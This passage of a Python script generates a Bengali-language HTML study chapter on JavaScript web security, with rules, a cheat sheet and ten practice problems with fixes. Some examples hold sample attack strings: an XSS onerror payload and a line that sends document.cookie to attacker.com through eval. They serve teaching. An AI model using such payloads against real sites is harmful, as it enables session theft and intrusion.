            html_parts.append(f'      <div class="section-subhead" style="font-size: 11px; color: var(--navy-deep); border-left: 2px solid var(--blue-accent); padding-left: 5px;">🛡️ {inline_format(sub_title)}</div>\n')
        elif ls.startswith('* ') or ls.startswith('- '):
            if not in_list:
                if p_acc:
                    p_text = " ".join(p_acc).strip()
                    if p_text and p_text != '---':
                        html_parts.append(f'      <p class="text-p">{inline_format(p_text)}</p>\n')
                    p_acc = []
                html_parts.append('      <ul style="margin: 2px 0 5px 16px; color: #334155; font-size: 10.5px;">\n')
                in_list = True
            html_parts.append(f'        <li>{inline_format(ls[2:])}</li>\n')
        elif ls.startswith('> '):
            if in_list:
                html_parts.append('      </ul>\n')
                in_list = False
            if p_acc:
                p_text = " ".join(p_acc).strip()
                if p_text and p_text != '---':
                    html_parts.append(f'      <p class="text-p">{inline_format(p_text)}</p>\n')
                p_acc = []
            quote_text = ls[2:].strip()
            html_parts.append(f'      <div class="warn-box">⚠️ {inline_format(quote_text)}</div>\n')
        else:
            if in_list:
                html_parts.append('      </ul>\n')
                in_list = False
            p_acc.append(ls)
            
    if in_list:
        html_parts.append('      </ul>\n')
    if p_acc:
        p_text = " ".join(p_acc).strip()
        if p_text and p_text != '---':
            html_parts.append(f'      <p class="text-p">{inline_format(p_text)}</p>\n')
            
    html_parts.append('    </div>\n')

# Section 70: MUST KNOW
sec70_text = raw_sections[70].strip()

html_parts.append('''    <div class="study-card">
      <div class="card-title"><span class="badge-num">31.70</span> 🔥 MUST KNOW — ওয়েব সিকিউরিটির প্রধান স্তম্ভসমূহ</div>
      <p class="text-p">চ্যাপ্টার ৩১ থেকে প্রতিটি সফটওয়্যার ইঞ্জিনিয়ারের যেসব বিষয় সরাসরি মস্তিষ্কে গেঁথে থাকা বাধ্যতামূলক:</p>
      <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 4px;">
        <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 5px; padding: 6px 8px;">
          <div style="font-weight: 700; color: #dc2626; font-size: 10px; margin-bottom: 3px;">📌 1. XSS &amp; DOM Security</div>
          <ul style="margin-left: 14px; font-size: 9px; color: #334155; line-height: 1.4;">
            <li>Stored, Reflected, DOM-based XSS</li>
            <li>Dangerous Sinks: <code>innerHTML</code>, <code>eval()</code></li>
            <li>Safe Sinks: <code>textContent</code>, DOMPurify</li>
            <li>Content Security Policy (CSP)</li>
          </ul>
        </div>
        <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 5px; padding: 6px 8px;">
          <div style="font-weight: 700; color: #d97706; font-size: 10px; margin-bottom: 3px;">📌 2. Request &amp; Origin Security</div>
          <ul style="margin-left: 14px; font-size: 9px; color: #334155; line-height: 1.4;">
            <li>CSRF &amp; SameSite Cookies</li>
            <li>Same-Origin Policy (SOP: Scheme+Host+Port)</li>
            <li>CORS Preflight &amp; Access-Control Headers</li>
            <li>CORS is NOT Authentication</li>
          </ul>
        </div>
        <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 5px; padding: 6px 8px;">
          <div style="font-weight: 700; color: #059669; font-size: 10px; margin-bottom: 3px;">📌 3. Identity &amp; Transport Defense</div>
          <ul style="margin-left: 14px; font-size: 9px; color: #334155; line-height: 1.4;">
            <li>HttpOnly + Secure + SameSite Cookies</li>
            <li>JWT Header.Payload.Signature &amp; Verification</li>
            <li>HTTPS, TLS &amp; HSTS Strict Headers</li>
            <li>Secrets Management &amp; Server-side AuthZ</li>
          </ul>
        </div>
      </div>
    </div>
''')

# Part 12: Cheat Sheet, 10 Rules, Practice Lab & Final Mental Map
pb12 = check_part_banner(71)
if pb12:
    html_parts.append(f'    {pb12}\n')

# Quick Cheat Sheet Table
m_table = re.search(r'(\|[\s\S]*\|)', sec70_text)
html_parts.append(f'''    <div class="study-card">
      <div class="card-title"><span class="badge-num">31.Cheat</span> 🧠 Quick Cheat Sheet — Web Security Terminology</div>
      <p class="text-p">ওয়েব সিকিউরিটির সর্বাধিক ব্যবহৃত টার্মগুলোর তাৎক্ষণিক অর্থ ও ভূমিকা:</p>
      {render_table(m_table.group(1)) if m_table else ""}
    </div>
''')

# 10 Golden Security Rules
html_parts.append('''    <div class="study-card">
      <div class="card-title"><span class="badge-num">31.Rules</span> 🔥 সবচেয়ে গুরুত্বপূর্ণ ১০টি Security Rules</div>
      <p class="text-p">প্রোডাকশন গ্রেড ওয়েব অ্যাপ্লিকেশন তৈরির সময় প্রতিটি ইঞ্জিনিয়ারের এই ১০টি মূলনীতি মেনে চলা আবশ্যক:</p>
      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-top: 5px;">
        <div style="background: #f8fafc; border-left: 3px solid #ef4444; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
          <strong>Rule 1:</strong> Never trust user input (Always validate &amp; sanitize).
        </div>
        <div style="background: #f8fafc; border-left: 3px solid #f97316; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
          <strong>Rule 2:</strong> Never trust the frontend for authorization (Server-side check is mandatory).
        </div>
        <div style="background: #f8fafc; border-left: 3px solid #eab308; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
          <strong>Rule 3:</strong> Never put real secrets or private keys in frontend client code.
        </div>
        <div style="background: #f8fafc; border-left: 3px solid #84cc16; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
          <strong>Rule 4:</strong> Avoid <code>eval()</code> and <code>new Function()</code> with untrusted input.
        </div>
        <div style="background: #f8fafc; border-left: 3px solid #10b981; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
          <strong>Rule 5:</strong> Prefer <code>textContent</code> over <code>innerHTML</code> for plain text rendering.
        </div>
        <div style="background: #f8fafc; border-left: 3px solid #06b6d4; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
          <strong>Rule 6:</strong> Validate input strictly on the server (Client validation is just UX).
        </div>
        <div style="background: #f8fafc; border-left: 3px solid #3b82f6; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
          <strong>Rule 7:</strong> Use HTTPS and HSTS for all communication in production.
        </div>
        <div style="background: #f8fafc; border-left: 3px solid #6366f1; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
          <strong>Rule 8:</strong> Protect session credentials with <code>HttpOnly; Secure; SameSite</code> cookies.
        </div>
        <div style="background: #f8fafc; border-left: 3px solid #8b5cf6; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
          <strong>Rule 9:</strong> Keep dependencies updated, lock versions and audit using <code>npm audit</code>.
        </div>
        <div style="background: #f8fafc; border-left: 3px solid #ec4899; padding: 5px 8px; border-radius: 0 4px 4px 0; font-size: 9.5px;">
          <strong>Rule 10:</strong> Security is layered (Defense-in-Depth), never rely on a single defensive tool.
        </div>
      </div>
    </div>
''')

# 10 Hands-On Practice Problems with Full Model Solutions
practice_solutions = [
    {
        "id": "Practice 1",
        "level": "Beginner",
        "title": "DOM XSS Sinks: innerHTML vs textContent",
        "question": "কোনটি safer: element.innerHTML = userInput নাকি element.textContent = userInput? কেন?",
        "code": """// ❌ Dangerous Sink:
element.innerHTML = userInput; // Executes <img src=x onerror=alert(1)>

// ✅ Safe Property:
element.textContent = userInput; // Encodes characters as harmless plain text""",
        "output": "Plain Text Safe Render",
        "answer": """১. 'textContent' শতভাগ নিরাপদ।
২. কারণ: 'innerHTML' ব্রাউজারের HTML পার্সারকে সক্রিয় করে। যদি userInput-এ ক্ষতিকর স্ক্রিপ্ট বা ইভেন্ট হ্যান্ডলার (যেমন <img src=x onerror=...>) থাকে, তবে ব্রাউজার তা এক্সিকিউট করে ফেলবে (DOM XSS)।
৩. অপরদিকে, 'textContent' ব্রাউজারের পার্সারকে বাইপাস করে এবং ইনপুটকে খাঁটি স্ট্রিং হিসেবে DOM টেক্সট নোডে ইনসার্ট করে। সব বিশেষ ক্যারেক্টার স্বয়ংক্রিয়ভাবে নিষ্ক্রিয় থাকে।"""
    },
    {
        "id": "Practice 2",
        "level": "Beginner",
        "title": "Authentication vs Authorization Distinction",
        "question": "Authentication আর Authorization-এর মূল পার্থক্য কী?",
        "code": """// Authentication (Identity Verification):
const isAuthenticated = verifyPassword(user.email, user.password); // "Who are you?"

// Authorization (Permission / Access Control):
const isAuthorized = user.role === "admin" && user.permissions.includes("DELETE_USER"); // "What are you allowed to do?" """,
        "output": "AuthN: Verified User | AuthZ: Access Granted",
        "answer": """১. Authentication (AuthN): এটি ব্যবহারকারীর পরিচয় নিশ্চিত করার প্রক্রিয়া—'তুমি কে?' (e.g. Email+Password, OTP, Biometrics)।
২. Authorization (AuthZ): পরিচয় নিশ্চিত হওয়ার পর ব্যবহারকারী নির্দিষ্ট কোনো রিসোর্স দেখতে বা পরিবর্তন করতে পারে কি না তা নির্ধারণ করা—'তুমি কী করতে পারো?' (e.g. Admin, Editor, Regular User)।
৩. সিকিউরিটি নোট: একজন ইউজার লগইন থাকলেই (Authenticated) সে অন্য কারো ডেটা ডিলিট করার অধিকার (Authorized) পায় না।"""
    },
    {
        "id": "Practice 3",
        "level": "Beginner",
        "title": "CORS (Cross-Origin Resource Sharing) Purpose",
        "question": "CORS কী সমাধান করে এবং কেন এটি গুরুত্বপূর্ণ?",
        "code": """// Browser Same-Origin Policy blocks Cross-Origin Fetch by default:
fetch("https://api.bank.com/data"); // Blocked if frontend is https://my-app.com

// Server sends CORS response header to explicitly allow access:
// Access-Control-Allow-Origin: https://my-app.com""",
        "output": "Cross-Origin Access Allowed by Server",
        "answer": """১. ব্রাউজারের Same-Origin Policy (SOP) ডিফল্টভাবে এক অরিজিন থেকে অন্য অরিজিনে JavaScript রিকোয়েস্টের রেসপন্স রিড করতে দেয় না।
২. CORS হলো একটি মেকানিজম যার মাধ্যমে সার্ভার ব্রাউজারকে নির্দেশ দেয় যে কোন কোন থার্ড-পার্টি অরিজিনকে এই এপিআই-এর রেসপন্স পড়ার অনুমতি দেওয়া যেতে পারে।
৩. গুরুত্বপূর্ণ সত্য: CORS কোনো সার্ভার-সাইড ফায়ারওয়াল বা অথেনটিকেশন নয়; এটি শুধুমাত্র ব্রাউজারকে প্রটেক্ট করে। Postman বা cURL দিয়ে CORS বাইপাস করা যায়।"""
    },
    {
        "id": "Practice 4",
        "level": "Intermediate",
        "title": "eval() Code Injection Vulnerability",
        "question": "কেন eval(userInput) ব্যবহার করা অত্যন্ত বিপজ্জনক?",
        "code": """// ❌ Extreme Hazard:
const userInput = 'fetch("https://attacker.com/steal?c=" + document.cookie)';
eval(userInput); // Arbitrary Code Executed with Full User Privileges!

// ✅ Safe Alternative:
const safeData = JSON.parse(userInputJson);""",
        "output": "Malicious Code Injected & Executed",
        "answer": """১. 'eval()' পাস করা যেকোনো স্ট্রিংকে সরাসরি পূর্ণাঙ্গ জাভাস্ক্রিপ্ট কোড হিসেবে এক্সিকিউট করে।
২. যদি কোনো আক্রমণকারী ইনপুটে ক্ষতিকর কোড পাঠায়, তবে এটি বর্তমান ইউজারের সমস্ত অধিকার (Cookies, Session, LocalStorage, DOM) দিয়ে ক্লায়েন্ট মেশিনে রান করবে।
৩. এটি JIT অপটিমাইজেশন নষ্ট করে পারফরম্যান্স কমায় এবং বিশাল সিকিউরিটি হোল তৈরি করে। আধুনিক জাভাস্ক্রিপ্টে ডেটা পার্সিংয়ের জন্য 'JSON.parse()' ব্যবহার করা উচিত।"""
    },
    {
        "id": "Practice 5",
        "level": "Intermediate",
        "title": "Frontend Authorization Bypass Fallacy",
        "question": "কেন 'if (user.role === \"admin\") showDeleteButton();' সিকিউরিটির জন্য যথেষ্ট নয়?",
        "code": """// ❌ Frontend-only UI Hiding (False Sense of Security):
if (user.role === "admin") {
    showDeleteButton();
}

// ⚠️ Attacker can easily inspect DevTools, unhide the button, or run:
fetch("/api/delete-user/42", { method: "DELETE" });

// ✅ Mandatory Server-side Authorization:
app.delete("/api/delete-user/:id", verifyToken, requireRole("admin"), (req, res) => {
    // Authorized action executed safely on server
});""",
        "output": "Unauthorized Request Blocked with 403 Forbidden",
        "answer": """১. ফ্রন্টএন্ড কোড ইউজারের ব্রাউজারে রান হয়, যা আক্রমণকারী সম্পূর্ণভাবে নিয়ন্ত্রণ (Inspect, Modify, Override) করতে পারে।
২. শুধু বাটন লুকিয়ে রাখা কোনো সিকিউরিটি নয়; আক্রমণকারী সরাসরি নেটওয়ার্ক ট্যাব বা কনসোল দিয়ে API এন্ডপয়েন্টে DELETE রিকোয়েস্ট পাঠিয়ে দিতে পারে।
৩. সমাধান: প্রতিটি সুরক্ষিত অ্যাকশনের জন্য ব্যাকএন্ড সার্ভারে রোল ও পারমিশন ভ্যালিডেশন (403 Forbidden) থাকা বাধ্যতামূলক।"""
    },
    {
        "id": "Practice 6",
        "level": "Intermediate",
        "title": "Production Cookie Security Flags Breakdown",
        "question": "Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax এর প্রতিটি অংশের ভূমিকা ব্যাখ্যা করো।",
        "code": """Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax""",
        "output": "Session Cookie Hardened against XSS & CSRF",
        "answer": """১. 'sessionId=abc123': সেশন আইডেন্টিফায়ার কি-ভ্যালু পেয়ার।
২. 'HttpOnly': ক্লায়েন্ট-সাইড জাভাস্ক্রিপ্ট (document.cookie) দিয়ে এই কুকি পড়া বা চুরি করা সম্পূর্ণ বন্ধ করে, যা XSS আক্রমণ থেকে টোকেন রক্ষা করে।
৩. 'Secure': কুকিটি কেবল এনক্রিপ্টেড HTTPS কানেকশনেই ব্রাউজার সার্ভারে পাঠাবে; সাধারণ আন-এনক্রিপ্টেড HTTP দিয়ে পাঠাবে না (Man-in-the-Middle স্নাইফিং প্রতিরোধ)।
৪. 'SameSite=Lax': অন্য কোনো ওয়েবসাইট থেকে ক্রস-সাইট রিকোয়েস্ট (e.g. POST/Form submission) পাঠালে ব্রাউজার এই কুকি সংযুক্ত করবে না, যা CSRF আক্রমণ প্রতিরোধ করে।"""
    },
    {
        "id": "Practice 7",
        "level": "Advanced 🔥",
        "title": "DOM-Based XSS via URL Parameter Identification & Patch",
        "question": "নিচের কোডের সিকিউরিটি সমস্যা চিহ্নিত করো এবং নিরাপদ কোডে রূপান্তর করো:",
        "code": """// ❌ Vulnerable DOM-based XSS:
const query = location.search; // Attacker sends: ?name=<img src=x onerror=alert(1)>
document.querySelector("#result").innerHTML = query;

// ✅ Production Safe Solution:
const params = new URLSearchParams(location.search);
const safeQuery = params.get("name") || "";
document.querySelector("#result").textContent = safeQuery;""",
        "output": "Sanitized Safe DOM Insertion",
        "answer": """১. সমস্যা: URL প্যারামিটার থেকে সরাসরি 'innerHTML'-এ ডেটা অ্যাসাইন করায় DOM-Based XSS আক্রমণ সম্ভব। আক্রমণকারী ভিকটিমকে ক্ষতিকর প্যারামিটারসহ লিংক পাঠিয়ে সেশন হাইজ্যাক করতে পারে।
২. সমাধান: 'URLSearchParams' দিয়ে নিরাপদভাবে প্যারামিটার এক্সট্র্যাক্ট করে 'textContent' প্রোপার্টি ব্যবহার করতে হবে। যদি HTML রেন্ডার করতেই হয়, তবে DOMPurify দিয়ে স্যানিটাইজ করে নেওয়া বাধ্যতামূলক।"""
    },
    {
        "id": "Practice 8",
        "level": "Advanced 🔥",
        "title": "Comprehensive Defense Comparison: XSS vs CSRF vs CORS",
        "question": "XSS, CSRF এবং CORS-এর মূল পার্থক্য ও সম্পর্ক এক নজরে ব্যাখ্যা করো।",
        "code": """// XSS: Attacker runs arbitrary JavaScript inside victim's trusted browser.
// CSRF: Attacker tricks victim's browser into sending an authenticated request to a trusted server.
// CORS: Browser mechanism to allow or deny cross-origin HTTP responses.""",
        "output": "XSS = Code Injection | CSRF = Request Forgery | CORS = Browser Origin Restriction",
        "answer": """১. XSS (Cross-Site Scripting): ভিকটিমের ব্রাউজারে আক্রমণকারীর কোড রান করায়। প্রতিকার: Input Validation, textContent, DOMPurify, CSP।
২. CSRF (Cross-Site Request Forgery): আক্রমণকারী ভিকটিমের কুকি ব্যবহার করে না জেনে অন্য সাইটে ট্রানজেকশন করায়। প্রতিকার: SameSite Cookies, Anti-CSRF Tokens, Custom Headers।
৩. CORS (Cross-Origin Resource Sharing): ব্রাউজারকে ভিন্ন অরিজিন থেকে রেসপন্স পড়ার অনুমতি দেয়। প্রতিকার: সঠিক Access-Control-Allow-Origin সেট করা।"""
    },
    {
        "id": "Practice 9",
        "level": "Advanced 🔥",
        "title": "Frontend Secrets Leakage & Reverse Engineering Reality",
        "question": "কেন frontend JavaScript কোডে 'const SECRET_API_KEY = \"super-secret\";' রাখা যাবে না?",
        "code": """// ❌ Fatal Security Anti-Pattern:
const SECRET_STRIPE_KEY = "sk_live_51M..."; // Publicly Visible in Network & Sources tab!

// ✅ Safe Production Architecture:
// Frontend calls internal backend API -> Backend calls Stripe using Secret Key stored on Server Env.""",
        "output": "Secret Protected Behind Server Proxy",
        "answer": """১. ব্রাউজার একটি ওপেন ক্লায়েন্ট এনভায়রনমেন্ট। যেকোনো ইউজার F12 প্রেস করে Sources ট্যাব, নেটওয়ার্ক লগ বা বান্ডল কোড (মিনিফাইড হলেও) রিভার্স-ইঞ্জিনিয়ারিং করে সমস্ত স্ট্রিং পড়ে ফেলতে পারে।
২. '.env' ফাইলে ফ্রন্টএন্ডে কি রাখলেও তা বিল্ড টাইমে (Webpack/Vite) ক্লায়েন্ট কোডে সরাসরি প্রতিস্থাপিত হয়ে যায়।
৩. নিয়ম: কোনো প্রাইভেট কী বা ডেটাবেস সিক্রেট কখনো ফ্রন্টএন্ডে রাখা যাবে না। ফ্রন্টএন্ড কেবল নিজস্ব ব্যাকএন্ডের সাথে যোগাযোগ করবে, এবং ব্যাকএন্ড সিক্রেট কি দিয়ে থার্ড পার্টি এপিআই কল করবে।"""
    },
    {
        "id": "Practice 10",
        "level": "Advanced 🔥",
        "title": "End-to-End Enterprise Admin Dashboard Security Architecture",
        "question": "একটি সুরক্ষিত অ্যাডমিন ড্যাশবোর্ডের প্রতিটি লেয়ারের সিকিউরিটি মেজার ডিজাইন করো:",
        "code": """// Enterprise Multi-Layer Security Architecture:
// 1. Transport Layer: HTTPS (TLS 1.3) + HSTS
// 2. Client Security: CSP + Frame-Ancestors DENY + HttpOnly Cookies
// 3. Auth Pipeline: bcrypt hashed password + Rate-limited Login + MFA
// 4. API Layer: JWT Signature Verification + Server-side RBAC + Input Validation
// 5. Database: Parameterized SQL queries (No Injection) + Principle of Least Privilege""",
        "output": "Zero-Trust Defense-in-Depth Pipeline Active",
        "answer": """১. Transport: HTTPS এবং HSTS হেডার দিয়ে ম্যান-ইন-দ্য-মিডল স্নাইফিং বন্ধ করা।
২. Client/Browser: CSP দিয়ে আন-অথরাইজড স্ক্রিপ্ট এক্সিকিউশন রোধ এবং X-Frame-Options দিয়ে ক্লিকজ্যাকিং প্রতিরোধ।
৩. Authentication: ব্রুট-ফোর্স আটকাতে এপিআই রেট লিমিটিং, পাসওয়ার্ড হ্যাশিং (argon2/bcrypt) এবং রিফ্রেশ টোকেন রোটেশন।
৪. Session Management: এক্সেস টোকেন মেমরিতে এবং রিফ্রেশ টোকেন 'HttpOnly; Secure; SameSite=Strict' কুকিতে সংরক্ষণ।
৫. Authorization & Database: প্রতি এপিআই কলে রোল চেক (Admin Guard) এবং ডেটাবেসে প্যারামিটারাইজড কুয়েরি ব্যবহার।"""
    }
]

html_parts.append('''    <div class="study-card">
      <div class="card-title"><span class="badge-num">31.Lab</span> 📝 Hands-On Practice Lab — 10 Web Security Challenges &amp; Full Model Solutions</div>
      <p class="text-p">বাস্তব জীবনের প্রোডাকশন সিকিউরিটি ডিফেন্স যাচাই করতে ১০টি ইন্টারভিউ চ্যালেঞ্জের বিস্তারিত ব্যাখ্যা ও সমাধান:</p>
''')

for p in practice_solutions:
    lvl_color = "#059669" if p["level"] == "Beginner" else ("#d97706" if "Intermediate" in p["level"] else "#dc2626")
    html_parts.append(f'''      <div class="practice-item">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px;">
          <span style="font-weight: 700; font-size: 11px; color: var(--navy-deep);">{p["id"]}: {p["title"]}</span>
          <span style="background: {lvl_color}; color: white; font-size: 8px; font-weight: 700; padding: 1px 6px; border-radius: 3px; text-transform: uppercase;">{p["level"]}</span>
        </div>
        <p class="text-p" style="margin-bottom: 3px; font-weight: 600; color: #0f172a;">❓ {p["question"]}</p>
        {render_code_box(p["code"], lang="javascript", title=f'{p["id"]} Security Challenge')}
        {render_output_box(p["output"])}
        <div class="def-box" style="margin-top: 3px; background: #f8fafc; border-left: 3px solid var(--blue-accent);">
          <div style="font-weight: 700; font-size: 9px; color: var(--blue-dark); margin-bottom: 2px;">🔍 Model Solution &amp; Defensive Architecture:</div>
          <div style="font-size: 8.5px; color: #334155; line-height: 1.4; white-space: pre-wrap;">{p["answer"]}</div>
        </div>
      </div>
''')

html_parts.append('    </div>\n')

# Final Mental Map
final_map_match = re.search(r'# 🎯 Final Mental Map[\s\S]*?```text([\s\S]*?)```', raw_sections[70])
final_map_ascii = final_map_match.group(1).strip() if final_map_match else ""

# End mental model
end_model_match = re.search(r'## ⭐ একদম শেষের Mental Model[\s\S]*?```text([\s\S]*?)```', raw_sections[70])
end_model_ascii = end_model_match.group(1).strip() if end_model_match else ""

html_parts.append(f'''    <div class="study-card">
      <div class="card-title"><span class="badge-num">31.Map</span> 🎯 Final Mental Map — Global Web Security Architecture</div>
      <p class="text-p">ব্রাউজার, নেটওয়ার্ক, অ্যাপ্লিকেশন ও ডেটাবেস স্তরের সমন্বিত নিরাপত্তা কাঠামোর মানসিক মানচিত্র:</p>
      {render_ascii_box(final_map_ascii, title="Full-Stack Web Security Coordination Tree")}
      
      <div class="section-subhead" style="margin-top: 6px;">⭐ এন্ড-টু-এন্ড রিকোয়েস্ট সিকিউরিটি পাইপলাইন:</div>
      {render_ascii_box(end_model_ascii, title="Zero-Trust Input & Execution Pipeline")}

      <div class="def-box" style="margin-top: 6px; padding: 6px 10px; background: #fef2f2; border-left: 3px solid #ef4444;">
        <div style="font-weight: 700; font-size: 10px; color: #991b1b; margin-bottom: 2px;">🔥 Chapter 31-এর সবচেয়ে গুরুত্বপূর্ণ চিরন্তন বাক্য:</div>
        <div style="font-size: 10px; color: #b91c1c; font-weight: 600; line-height: 1.45;">
          “Never trust the client, never trust user input, and never assume one security mechanism is enough.”
        </div>
      </div>

      <div class="def-box" style="margin-top: 6px; padding: 6px 10px; background: #eff6ff; border-left: 3px solid #2563eb;">
        <div style="font-weight: 700; font-size: 10px; color: #1e40af; margin-bottom: 2px;">🚀 Next Chapter Preview:</div>
        <div style="font-family: var(--font-heading); font-size: 10px; font-weight: 700; color: #0369a1;">
          Chapter 32 — Advanced Browser APIs
        </div>
        <div style="font-size: 9px; color: #334155; margin-top: 2px;">পরবর্তী চ্যাপ্টারে আমরা শিখব Geolocation, IntersectionObserver, MutationObserver, ResizeObserver, Clipboard, Web Workers, IndexedDB, WebSockets এবং File API।</div>
      </div>
    </div>

  </div>

</body>
</html>
''')

# Write complete HTML file
output_html_path = r'c:\Users\User\Desktop\Note-Book\Code\Chapter-31-JavaScript-Web-Security.html'
with open(output_html_path, 'w', encoding='utf-8') as f:
    f.write(''.join(html_parts))

print(f"Successfully generated Chapter 31 HTML: {output_html_path}")
print(f"File size: {os.path.getsize(output_html_path)} bytes")
